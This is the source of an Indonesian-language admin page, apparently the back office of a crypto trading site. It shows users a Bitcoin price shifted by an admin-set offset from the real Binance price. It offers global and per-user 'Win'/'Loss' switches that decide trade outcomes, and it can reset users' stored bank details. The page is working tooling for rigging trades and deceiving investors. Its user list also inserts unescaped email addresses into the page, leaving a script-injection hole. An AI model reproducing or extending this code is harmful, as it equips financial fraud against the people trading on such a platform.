<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Admin | Market Control & User Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="config.js"></script>
    <style>
        .gold-text { color: #f3ba2f; }
        .glass-card { background: #0f0f0f; border: 1px solid rgba(255,255,255,0.1); }
        body { background-color: #050505; overflow-x: hidden; }
        
        /* Animasi Toast */
        #toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .toast {
            animation: slideIn 0.3s ease forwards;
            min-width: 250px;
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }
    </style>
</head>
<body class="text-white p-4 font-sans">

    <div id="toast-container"></div>

    <div class="max-w-md mx-auto mb-6 flex items-center justify-between glass-card p-3 rounded-2xl">
        <div class="flex items-center gap-2 px-3 py-2 bg-yellow-500/10 rounded-xl">
            <i data-lucide="shield-check" class="w-4 h-4 gold-text"></i>
            <span class="text-[10px] font-black gold-text uppercase">Admin Panel</span>
        </div>
        <button onclick="window.location.href='managegrafik.html'" class="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 rounded-xl border border-white/5 transition-all">
            <span class="text-[10px] font-black text-gray-300 uppercase">Grafik</span>
            <i data-lucide="trending-up" class="w-4 h-4 text-yellow-500"></i>
        </button>
    </div>

    <div class="max-w-md mx-auto space-y-6">
        
        <div class="glass-card p-6 rounded-[2rem] space-y-4 shadow-2xl">
            <h2 class="text-[10px] font-black uppercase tracking-widest text-gray-500 italic">Market Price Control</h2>
            <div class="grid grid-cols-2 gap-4 text-center">
                <div class="border-r border-white/5">
                    <p class="text-[8px] text-gray-500 font-bold uppercase">Real Price</p>
                    <p id="real-p" class="font-mono text-lg font-black italic text-white">$0</p>
                </div>
                <div>
                    <p class="text-[8px] text-gray-500 font-bold uppercase gold-text">User Price</p>
                    <p id="user-p" class="font-mono text-lg font-black italic gold-text">$0</p>
                </div>
            </div>
            <div class="flex gap-2">
                <input type="number" id="offset" placeholder="Offset Harga" class="flex-grow bg-black border border-white/10 p-4 rounded-2xl text-sm font-bold outline-none focus:border-yellow-500 transition-all text-white">
                <button onclick="applyOffset()" class="bg-yellow-500 text-black px-6 font-black rounded-2xl text-xs hover:bg-yellow-400 active:scale-95 transition-all">SET</button>
            </div>
        </div>

        <div class="grid grid-cols-3 gap-2">
            <button onclick="setGlobal('win')" class="bg-green-600/10 border border-green-600/30 p-4 rounded-2xl text-[8px] font-black text-green-500 hover:bg-green-600/20 active:scale-95 transition-all">GLOBAL WIN</button>
            <button onclick="setGlobal('normal')" class="bg-gray-600/10 border border-gray-600/30 p-4 rounded-2xl text-[8px] font-black text-gray-400 hover:bg-gray-600/20 active:scale-95 transition-all">NORMAL</button>
            <button onclick="setGlobal('loss')" class="bg-red-600/10 border border-red-600/30 p-4 rounded-2xl text-[8px] font-black text-red-500 hover:bg-red-600/20 active:scale-95 transition-all">GLOBAL LOSS</button>
        </div>

        <div class="space-y-4">
            <div class="flex justify-between items-center px-1">
                <p class="text-[9px] font-black text-gray-500 tracking-widest uppercase italic">Target User Terdeteksi</p>
                <button onclick="loadUsers()" class="text-[9px] font-black text-yellow-500 uppercase flex items-center gap-1">
                    <i data-lucide="refresh-cw" class="w-3 h-3"></i> Refresh
                </button>
            </div>

            <div id="user-list" class="space-y-3">
                <div class="flex justify-center py-10 opacity-20"><i data-lucide="loader" class="animate-spin"></i></div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, onSnapshot, setDoc, updateDoc, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const app = initializeApp(APP_CONFIG.firebase);
        const db = getFirestore(app);
        let base = 0, offset = 0;

        // FUNGSI NOTIFIKASI (TOAST)
        function showNotify(message, type = 'success') {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            const bgColor = type === 'success' ? 'bg-green-500' : (type === 'error' ? 'bg-red-500' : 'bg-yellow-500');
            
            toast.className = `${bgColor} text-black text-[10px] font-black uppercase p-4 rounded-xl shadow-lg toast flex items-center gap-3`;
            toast.innerHTML = `
                <i data-lucide="${type === 'success' ? 'check-circle' : 'alert-circle'}" class="w-4 h-4"></i>
                <span>${message}</span>
            `;
            
            container.appendChild(toast);
            lucide.createIcons();

            setTimeout(() => {
                toast.style.animation = 'fadeOut 0.5s ease forwards';
                setTimeout(() => toast.remove(), 500);
            }, 3000);
        }

        // Live Market
        setInterval(async () => {
            try {
                const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
                const d = await res.json();
                base = parseFloat(d.price);
                document.getElementById('real-p').innerText = "$" + base.toLocaleString();
                document.getElementById('user-p').innerText = "$" + (base + offset).toLocaleString();
            } catch (e) { console.error("API Error"); }
        }, 1000);

        onSnapshot(doc(db, "system", "market_control"), (s) => {
            if(s.exists()){ 
                offset = s.data().offset || 0; 
                document.getElementById('offset').value = offset; 
            }
        });

        window.applyOffset = async () => {
            const val = parseFloat(document.getElementById('offset').value) || 0;
            try {
                await setDoc(doc(db, "system", "market_control"), { offset: val }, { merge: true });
                showNotify("Offset Berhasil Disimpan!");
            } catch(e) { showNotify("Gagal Simpan Offset", "error"); }
        };

        window.setGlobal = async (mode) => {
            try {
                await setDoc(doc(db, "system", "market_control"), { mode: mode }, { merge: true });
                showNotify("Mode " + mode.toUpperCase() + " Aktif!");
            } catch(e) { showNotify("Gagal Ubah Mode", "error"); }
        };

        window.target = async (id, m) => {
            try {
                await updateDoc(doc(db, "users", id), { next_trade: m });
                showNotify("User Target: " + m.toUpperCase());
            } catch(e) { showNotify("Gagal Set Target", "error"); }
        };

        window.resetBank = async (uid) => {
            if(confirm("Reset rekening user ini?")){
                try {
                    await updateDoc(doc(db, "users", uid), {
                        is_bank_locked: false,
                        bank_name: "", bank_number: "", bank_holder: ""
                    });
                    showNotify("Rekening User Berhasil Direset!");
                    loadUsers();
                } catch (e) { showNotify("Gagal Reset Rekening", "error"); }
            }
        };

        window.loadUsers = async () => {
            const snap = await getDocs(collection(db, "users"));
            const list = document.getElementById('user-list');
            list.innerHTML = "";
            snap.forEach(u => {
                const d = u.data();
                const isLocked = d.is_bank_locked ? 'ðŸ”’' : 'ðŸ”“';
                list.innerHTML += `
                <div class="glass-card p-4 rounded-3xl border border-white/5 space-y-4">
                    <div class="flex justify-between items-center">
                        <div class="flex items-center gap-2">
                            <span class="text-[10px]">${isLocked}</span>
                            <p class="text-[10px] font-bold text-gray-300 truncate w-40">${d.email || 'User'}</p>
                        </div>
                        <p class="text-[10px] font-black gold-text">Rp ${(d.balance || 0).toLocaleString()}</p>
                    </div>
                    <div class="grid grid-cols-3 gap-2">
                        <button onclick="target('${u.id}', 'win')" class="bg-green-600/10 text-green-500 py-3 rounded-xl text-[8px] font-black uppercase">Win</button>
                        <button onclick="target('${u.id}', 'loss')" class="bg-red-600/10 text-red-500 py-3 rounded-xl text-[8px] font-black uppercase">Loss</button>
                        <button onclick="resetBank('${u.id}')" class="bg-yellow-500/10 text-yellow-500 border border-yellow-500/20 py-3 rounded-xl text-[8px] font-black uppercase">Reset Rek</button>
                    </div>
                </div>`;
            });
            lucide.createIcons();
        };

        lucide.createIcons();
        loadUsers();
    </script>
</body>
</html>

